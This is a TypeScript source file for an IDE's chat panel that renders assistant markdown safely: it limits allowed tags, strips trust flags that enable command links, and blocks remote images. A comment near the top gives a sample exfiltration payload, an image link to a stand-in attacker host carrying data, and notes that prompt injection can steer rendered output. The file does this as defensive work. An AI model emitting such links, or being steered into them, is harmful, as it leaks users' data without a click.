/*---------------------------------------------------------------------------------------------
 *  Copyright (c) OpenIDE. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import { $, addDisposableListener, append, getWindow, isHTMLElement } from '../../../../../base/browser/dom.js';
import { StandardKeyboardEvent } from '../../../../../base/browser/keyboardEvent.js';
import { StandardMouseEvent } from '../../../../../base/browser/mouseEvent.js';
import { Codicon } from '../../../../../base/common/codicons.js';
import { onUnexpectedError } from '../../../../../base/common/errors.js';
import { Emitter, Event } from '../../../../../base/common/event.js';
import { KeyCode } from '../../../../../base/common/keyCodes.js';
import { LRUCache } from '../../../../../base/common/map.js';
import { ThemeIcon } from '../../../../../base/common/themables.js';
import { IClipboardService } from '../../../../../platform/clipboard/common/clipboardService.js';
import { allowedMarkdownHtmlAttributes, IRenderedMarkdown, MarkdownRenderOptions } from '../../../../../base/browser/markdownRenderer.js';
import { getDefaultHoverDelegate } from '../../../../../base/browser/ui/hover/hoverDelegateFactory.js';
import { IMarkdownString } from '../../../../../base/common/htmlContent.js';
import { DisposableStore, IDisposable } from '../../../../../base/common/lifecycle.js';
import { applyFontInfo } from '../../../../../editor/browser/config/domFontInfo.js';
import { IEditorOptions } from '../../../../../editor/common/config/editorOptions.js';
import { createBareFontInfoFromRawSettings } from '../../../../../editor/common/config/fontInfoFromSettings.js';
import { TokenizationRegistry } from '../../../../../editor/common/languages.js';
import { ILanguageService } from '../../../../../editor/common/languages/language.js';
import { PLAINTEXT_LANGUAGE_ID } from '../../../../../editor/common/languages/modesRegistry.js';
import { tokenizeToStringSync } from '../../../../../editor/common/languages/textToHtmlTokenizer.js';
import { IConfigurationService } from '../../../../../platform/configuration/common/configuration.js';
import { IHoverService } from '../../../../../platform/hover/browser/hover.js';
import { IMarkdownRenderer, IMarkdownRendererService, openLinkFromMarkdown } from '../../../../../platform/markdown/browser/markdownRenderer.js';
import { IOpenerService } from '../../../../../platform/opener/common/opener.js';
import product from '../../../../../platform/product/common/product.js';
import { t } from '../../common/openideStrings.js';
import { setupChatTooltip } from './openideChatHover.js';

/**
 * Tags an assistant turn may produce.
 *
 * Narrower than `allowedMarkdownHtmlTags` (base/browser/markdownRenderer.ts:554) on purpose:
 * `details`, `summary`, `label`, `source` and friends are collapsible/loadable surfaces we never
 * emit, and every tag left in the list is one more thing a prompt injection can try to steer.
 *
 * `input` IS in, and the note that used to say otherwise ("the transcript does not render
 * checkboxes") was simply wrong about what the agent writes: `- [x] …` task lists are how it
 * reports plans and summaries, and marked turns every one of them into `<input type="checkbox">`.
 * With the tag dropped and `replaceWithPlaintext` on, each item rendered as the literal text
 * `<input checked="" disabled="" type="checkbox"> Listar archivos…` — the tag printed instead of
 * drawn. Allowing it costs nothing: `renderMarkdown` post-processes every input, forcing `disabled`
 * on checkboxes and removing any other type (base/browser/markdownRenderer.ts:315-330), and the
 * attribute allowlist below already carries `type`/`checked`/`disabled` for exactly this.
 */
export const OPENIDE_CHAT_ALLOWED_MARKDOWN_TAGS = Object.freeze([
	'a', 'b', 'blockquote', 'br', 'code', 'del', 'em', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'hr',
	'i', 'img', 'input', 'ins', 'kbd', 'li', 'ol', 'p', 'pre', 's', 'strong', 'sub', 'sup',
	'table', 'tbody', 'td', 'th', 'thead', 'tr', 'ul',
	// Codicons and the syntax-highlighted code block markup both need these two.
	'span', 'div',
]);

/**
 * Blocks every remote image. A model that writes `![](https://attacker/pixel?data=…)` would
 * otherwise exfiltrate on render — no click needed — and unlike the old webview there is no CSP
 * in the workbench DOM to stop the request.
 */
const remoteImageIsAllowed = () => false;


/**
 * Sanitizer configuration for assistant output.
 *
 * Attributes reuse `allowedMarkdownHtmlAttributes` (base/browser/markdownRenderer.ts:559) rather
 * than a hand-written list: it already restricts `style` to a colour regex and `class` to
 * codicons, and a local copy would silently rot the day upstream tightens it.
 */
export function getOpenideChatMarkdownRenderOptions(options?: MarkdownRenderOptions): MarkdownRenderOptions {
	return {
		...options,
		sanitizerConfig: {
			// Dropped markup is shown as text instead of vanishing, so a mangled answer is
			// visibly mangled rather than quietly missing a sentence.
			replaceWithPlaintext: true,
			allowedTags: { override: OPENIDE_CHAT_ALLOWED_MARKDOWN_TAGS },
			allowedAttributes: { override: allowedMarkdownHtmlAttributes },
			...options?.sanitizerConfig,
			allowedLinkSchemes: { augment: [product.urlProtocol] },
			remoteImageIsAllowed,
		},
	};
}

/**
 * Strips the two flags that turn markdown into an execution surface.
 *
 * `isTrusted` is what lets `command:` links through `openLinkFromMarkdown`
 * (platform/markdown/browser/markdownRenderer.ts:89-101), i.e. arbitrary workbench commands from
 * one link click. `supportHtml` makes marked emit the model's raw HTML and leaves the sanitizer
 * as the only line of defence. Model output gets neither, whatever the producer set.
 */
export function asUntrustedChatMarkdown(markdown: IMarkdownString): IMarkdownString {
	if (!markdown.isTrusted && !markdown.supportHtml) {
		return markdown;
	}
	return { ...markdown, isTrusted: false, supportHtml: false };
}

/** The raw source of a fenced block, keyed by the element the tokenizer produced for it. */
const CODE_BLOCK_SOURCE = new WeakMap<Element, string>();

/** Where a link's native `title` is parked once the workbench hover has taken it over. */
const LINK_TITLE_ATTRIBUTE = 'data-oi-title';

/** Tokenized fences kept for reuse. A long answer re-renders a few hundred times; its fences do not change. */
const TOKENIZED_CACHE_SIZE = 200;

/**
 * Fenced code, tokenized SYNCHRONOUSLY and cached by (language, source).
 *
 * The renderer the workbench installs on `IMarkdownRendererService` (`EditorMarkdownCodeBlockRenderer`)
 * is async: it awaits the language's tokenizer, and the base renderer lands the result later by
 * looking up placeholders in the element it rendered into. That contract is what made the streamed
 * reply expensive — every delta re-tokenized every fence of the answer, hundreds of times over a
 * turn — and it is also what stands in the way of an incremental render, because a block moved
 * out of the render root can never receive its tokens.
 *
 * So the transcript tokenizes on the spot. `TokenizationRegistry.get` answers synchronously for
 * any language whose grammar is loaded; one that is not yet gets kicked off here and rendered as
 * plain text until `onDidLoadTokenizer` says otherwise, at which point the part renders again and
 * the fence picks up its colours. Everything else — the language alias lookup, the editor font on
 * the block — is what the workbench renderer does, kept identical so the fences do not change look.
 */
class OpenideChatCodeBlockTokenizer {

	private readonly _onDidLoadTokenizer = new Emitter<void>();
	readonly onDidLoadTokenizer: Event<void> = this._onDidLoadTokenizer.event;

	private readonly _cache = new LRUCache<string, HTMLElement>(TOKENIZED_CACHE_SIZE);
	private readonly _loading = new Set<string>();

	constructor(
		private readonly _languageService: ILanguageService,
		private readonly _configurationService: IConfigurationService,
	) { }

	render(languageAlias: string | undefined, value: string): HTMLElement {
		const languageId = (languageAlias && this._languageService.getLanguageIdByLanguageName(languageAlias)) || PLAINTEXT_LANGUAGE_ID;
		const key = `${languageId}\u0000${value}`;
		let element = this._cache.get(key);
		if (!element) {
			const loaded = languageId === PLAINTEXT_LANGUAGE_ID || !!TokenizationRegistry.get(languageId);
			if (!loaded) {
				this._loadTokenizer(languageId);
			}
			element = this._tokenize(value, languageId);
			if (loaded) {
				// A fence rendered while its grammar is still loading is plain text: not worth keeping.
				this._cache.set(key, element);
			}
		}
		const clone = element.cloneNode(true) as HTMLElement;
		CODE_BLOCK_SOURCE.set(clone, value);
		return clone;
	}

	private _loadTokenizer(languageId: string): void {
		if (this._loading.has(languageId)) {
			return;
		}
		this._loading.add(languageId);
		TokenizationRegistry.getOrCreate(languageId).then(
			() => { this._loading.delete(languageId); this._onDidLoadTokenizer.fire(); },
			() => { this._loading.delete(languageId); });
	}

	private _tokenize(value: string, languageId: string): HTMLElement {
		// `tokenizeToStringSync` falls back to a plain tokenizer for a language that is not loaded.
		const html = tokenizeToStringSync(this._languageService, value, languageId);
		// Parsed by `DOMParser` and not written through `innerHTML`: the workbench runs under a
		// Trusted Types policy list, and the parser is not one of its sinks. The markup is ours.
		const parsed = new DOMParser().parseFromString(html, 'text/html');
		// eslint-disable-next-line no-restricted-syntax
		const source = parsed.body.querySelector('.monaco-tokenized-source');
		const root = document.createElement('span');
		if (!isHTMLElement(source)) {
			return root;
		}
		const adopted = document.importNode(source, true);
		applyFontInfo(adopted, createBareFontInfoFromRawSettings({
			fontFamily: this._configurationService.getValue<IEditorOptions>('editor')?.fontFamily,
		}, 1));
		root.appendChild(adopted);
		return root;
	}
}

/**
 * Renders assistant markdown through `IMarkdownRendererService`.
 *
 * The service is a registered singleton (platform/markdown/browser/markdownRenderer.ts:115) and
 * the workbench installs a tokenizing code block renderer on it at startup
 * (workbench/browser/workbench.ts:152), so fenced code arrives syntax highlighted for free —
 * asynchronously, which is why callers of `render` must wire `asyncRenderCallback` to a height
 * signal. The transcript's prose goes through `renderBlocks` instead, which tokenizes on the spot
 * (`OpenideChatCodeBlockTokenizer`) and leaves the per-node extras to the caller, so a streamed
 * reply can keep the blocks that did not change.
 */
export class OpenideChatMarkdownRenderer implements IMarkdownRenderer {

	private readonly _codeBlocks: OpenideChatCodeBlockTokenizer;

	constructor(
		@IMarkdownRendererService private readonly _markdownRendererService: IMarkdownRendererService,
		@IHoverService private readonly _hoverService: IHoverService,
		@IClipboardService private readonly _clipboardService: IClipboardService,
		@IOpenerService private readonly _openerService: IOpenerService,
		@ILanguageService languageService: ILanguageService,
		@IConfigurationService configurationService: IConfigurationService,
	) {
		this._codeBlocks = new OpenideChatCodeBlockTokenizer(languageService, configurationService);
	}

	/** A grammar that was still loading when a fence was rendered has arrived: render again. */
	get onDidLoadTokenizer(): Event<void> {
		return this._codeBlocks.onDidLoadTokenizer;
	}

	render(markdown: IMarkdownString, options?: MarkdownRenderOptions, outElement?: HTMLElement): IRenderedMarkdown {
		const result = this._markdownRendererService.render(
			asUntrustedChatMarkdown(markdown),
			getOpenideChatMarkdownRenderOptions(options),
			outElement,
		);
		const store = new DisposableStore();
		this._decorateCodeBlocks(result.element);
		this._normalizeTopLevel(result.element);
		this.attachNodeExtras(result.element, store);

		return {
			element: result.element,
			dispose: () => {
				result.dispose();
				store.dispose();
			},
		};
	}

	/**
	 * The transcript's render: into a detached root, fences tokenized synchronously, no extras.
	 *
	 * Detached because the caller reconciles the result against what it already shows and only
	 * adopts the blocks that changed (`OpenideChatMarkdownPart`). Two things the base renderer
	 * ties to its root therefore have to be provided by the caller on ITS root, once:
	 * `attachLinkActivation` for the clicks, and `attachNodeExtras` per adopted block.
	 */
	renderBlocks(markdown: IMarkdownString, options?: MarkdownRenderOptions): IRenderedMarkdown {
		const result = this._markdownRendererService.render(
			asUntrustedChatMarkdown(markdown),
			getOpenideChatMarkdownRenderOptions({
				...options,
				codeBlockRendererSync: (languageId, value) => this._codeBlocks.render(languageId, value),
			}),
		);
		this._decorateCodeBlocks(result.element);
		this._normalizeTopLevel(result.element);
		return result;
	}

	/**
	 * The per-node extras: the copy button's tooltip and the workbench hover of every link with a
	 * title. Separate from the render because their lifetime is the NODE's, not the render's — a
	 * block kept across an incremental render keeps them, a dropped one takes them along.
	 */
	attachNodeExtras(node: HTMLElement, store: DisposableStore): void {
		// eslint-disable-next-line no-restricted-syntax
		const buttons = Array.from(node.querySelectorAll<HTMLButtonElement>('button.openide-chat-codeblock-copy'));
		for (const button of buttons) {
			store.add(setupChatTooltip(this._hoverService, button, () => t('chat.code.copy')));
		}
		// Native `title` tooltips move onto the workbench hover, which is themed and, unlike the
		// browser tooltip, cannot be used to paint text outside the window. The title is parked in
		// an attribute so the hover can be set up again on a node that outlived its first render.
		// eslint-disable-next-line no-restricted-syntax
		for (const anchor of node.querySelectorAll('a')) {
			if (anchor.title) {
				anchor.setAttribute(LINK_TITLE_ATTRIBUTE, anchor.title);
				anchor.title = '';
			}
			const title = anchor.getAttribute(LINK_TITLE_ATTRIBUTE);
			if (title) {
				store.add(this._hoverService.setupManagedHover(getDefaultHoverDelegate('element'), anchor, title));
			}
		}
	}

	/**
	 * Link activation for a host that adopts blocks from `renderBlocks`. The base renderer wires
	 * its click and keyboard handlers to the root it rendered into, which in that path is a scratch
	 * element nobody clicks; this is the same contract (`activateLink`, base/browser/markdownRenderer.ts)
	 * on the caller's root. Untrusted, always: assistant output never opens `command:` links.
	 */
	attachLinkActivation(host: HTMLElement): IDisposable {
		const store = new DisposableStore();
		const activate = (event: StandardMouseEvent | StandardKeyboardEvent) => {
			const target = event.target.closest('a[data-href]');
			if (!isHTMLElement(target)) {
				return;
			}
			try {
				const href = target.dataset['href'];
				if (href) {
					void openLinkFromMarkdown(this._openerService, href, false);
				}
			} catch (error) {
				onUnexpectedError(error);
			} finally {
				event.preventDefault();
				event.stopPropagation();
			}
		};
		const onClick = (event: MouseEvent) => {
			const mouseEvent = new StandardMouseEvent(getWindow(host), event);
			if (mouseEvent.leftButton || mouseEvent.middleButton) {
				activate(mouseEvent);
			}
		};
		store.add(addDisposableListener(host, 'click', onClick));
		store.add(addDisposableListener(host, 'auxclick', onClick));
		store.add(addDisposableListener(host, 'keydown', (event: KeyboardEvent) => {
			const keyboardEvent = new StandardKeyboardEvent(event);
			if (keyboardEvent.equals(KeyCode.Space) || keyboardEvent.equals(KeyCode.Enter)) {
				activate(keyboardEvent);
			}
		}));
		return store;
	}

	/**
	 * The copy button of every fenced block (the webview's `.code-copy`, the removed chat webview).
	 *
	 * The placeholder `div[data-code]` (the sanitizer strips its `code` class) is the element the
	 * tokenizer writes INTO (`DOM.reset`), so the button cannot live inside it: it is wrapped
	 * instead. The raw source comes from the tokenizer when the fence was tokenized synchronously,
	 * and from the placeholder's escaped text otherwise — the async tokenizer's markup, landing
	 * later, loses the line structure.
	 */
	private _decorateCodeBlocks(root: HTMLElement): void {
		// eslint-disable-next-line no-restricted-syntax
		for (const code of Array.from(root.querySelectorAll<HTMLElement>('div[data-code]'))) {
			if (code.parentElement?.classList.contains('openide-chat-codeblock')) {
				continue;
			}
			const tokenized = code.firstElementChild;
			const source = (tokenized && CODE_BLOCK_SOURCE.get(tokenized)) ?? code.textContent ?? '';
			const wrapper = $('.openide-chat-codeblock');
			code.replaceWith(wrapper);
			wrapper.appendChild(code);
			const button = append(wrapper, $('button.openide-chat-codeblock-copy')) as HTMLButtonElement;
			button.type = 'button';
			append(button, $(`span.${ThemeIcon.asClassName(Codicon.copy).replace(/ /g, '.')}`));
			button.addEventListener('click', event => {
				event.preventDefault();
				event.stopPropagation();
				void this._clipboardService.writeText(source).then(() => {
					button.classList.add('copied');
					setTimeout(() => button.classList.remove('copied'), 1200);
				});
			});
		}
	}

	/**
	 * marked can leave bare text nodes at the top level; the transcript's spacing comes from
	 * paragraph margins, so unwrapped text collapses against the row above it.
	 */
	private _normalizeTopLevel(root: HTMLElement): void {
		root.normalize();
		for (const child of Array.from(root.childNodes)) {
			if (child.nodeType === Node.TEXT_NODE && child.textContent?.trim()) {
				child.replaceWith($('p', undefined, child.textContent));
			}
		}
	}
}
